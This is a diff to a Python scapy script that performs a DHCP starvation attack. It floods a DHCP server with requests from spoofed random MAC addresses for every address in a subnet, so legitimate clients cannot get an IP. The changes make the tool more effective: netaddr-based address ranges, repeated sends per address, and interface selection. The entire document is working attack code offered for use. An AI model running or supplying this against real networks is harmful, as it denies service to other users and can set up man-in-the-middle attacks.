@@ -5,25 +5,45 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
+from netaddr import IPNetwork
+from random_name import random_hostname
 from scapy.all import *
 
-from random_name import random_hostname
+def get_addresses(net="192.168.1.0/24",
+                  start_ip="1",
+                  end_ip="254",
+                  excluded= ['0', '254']):
+    pool = IPNetwork(net)
+    addresses = []
+    ip_range = range(int(start_ip), int(end_ip)+1)
+    for p in pool:
+        str_ip = str(p)
+        prefix = '.'.join(str_ip.split('.')[0:-1])
+        suffix = int(str_ip.split('.')[-1])
+        if suffix in ip_range:
+            addresses.append(str_ip)
+    return addresses
 
-def starvit(ip_subnet="192.168.1.",
+def starvit(net="192.168.1.0/24",
             start_ip=1,
             end_ip=254,
             server_id="192.168.1.1",
             dst_mac="ff:ff:ff:ff:ff:ff",
             random_hostnames=False,
             timeout=0.2,
+            repetition=3,
             debug=0):
     # Stops scapy from checking return packet originating from any packet that we have sent out
-    conf.checkIPaddr = False    
-    for ip in range(start_ip, end_ip+1):
+    #conf.checkIPaddr = False 
+    
+    addresses = get_addresses(net=net,
+                              start_ip=start_ip,
+                              end_ip=end_ip)
+    
+    for ip in addresses:
         bogus_mac_address = RandMAC()
-        requested_ip = ip_subnet + str(ip)
         dhcp_options = [("message-type","request"),
-                        ("requested_addr", requested_ip),
+                        ("requested_addr", ip),
                         "end"]
         if server_id:
             dhcp_options.insert(1, ("server_id",server_id))
@@ -39,8 +59,9 @@ def starvit(ip_subnet="192.168.1.",
                            /BOOTP(chaddr=bogus_mac_address)\
                            /DHCP(options=dhcp_options)
         
-        sendp(dhcp_request)
-        print("Requesting: " + requested_ip)
+        print("Requesting: " + ip)
+        for i in range(repetition):
+            sendp(dhcp_request)
         if debug: dhcp_request.show()
         time.sleep(timeout)
 
@@ -48,8 +69,11 @@ def starvit(ip_subnet="192.168.1.",
 if __name__=="__main__":
     import argparse
     parser = argparse.ArgumentParser()
-    parser.add_argument('-subnet', required=True, 
-                        help="/24 subnet, example: -subnet 192.168.27.")
+    parser.add_argument('-i', required=True, 
+                        help="local network interface")
+                        
+    parser.add_argument('-net', required=True, 
+                        help="/24 subnet, example: -subnet 192.168.27.0/24")
     
     parser.add_argument('-start',
                         metavar='N',
@@ -64,6 +88,12 @@ if __name__=="__main__":
                         default=254,
                         help="how many request will be done")
 
+    parser.add_argument('-rep',
+                        metavar='N',
+                        type=int, 
+                        default=3,
+                        help="repetition, sometime packet get lost. Default: 3 requests per ip")
+
     parser.add_argument('-server_id', required=False, 
                         help="DHCP server id, example: 192.168.27.254")
 
@@ -73,7 +103,7 @@ if __name__=="__main__":
     parser.add_argument('-dst_mac', default="ff:ff:ff:ff:ff:ff", required=False, 
                         help="Destination DHCP MAC address, default: ff:ff:ff:ff:ff:ff")
 
-    parser.add_argument('-timeout', type=float, default=0.2, required=False, 
+    parser.add_argument('-timeout', type=float, default=0.5, required=False, 
                         help="seconds to wait between a request and another. example -timeout 0.2")
 
     parser.add_argument('-debug', action='store_true',
@@ -81,12 +111,16 @@ if __name__=="__main__":
 
     args = parser.parse_args()
     
+    # needed in presence of ovpn/tun/tap interfaces
+    conf.iface = args.i
+    
     # run!
-    starvit(ip_subnet=args.subnet,
+    starvit(net=args.net,
             start_ip=args.start,
             end_ip=args.end,
             server_id=args.server_id,
             dst_mac=args.dst_mac,
             random_hostnames=args.random_hostnames,
             timeout=args.timeout,
+            repetition=args.rep,
             debug=args.debug)
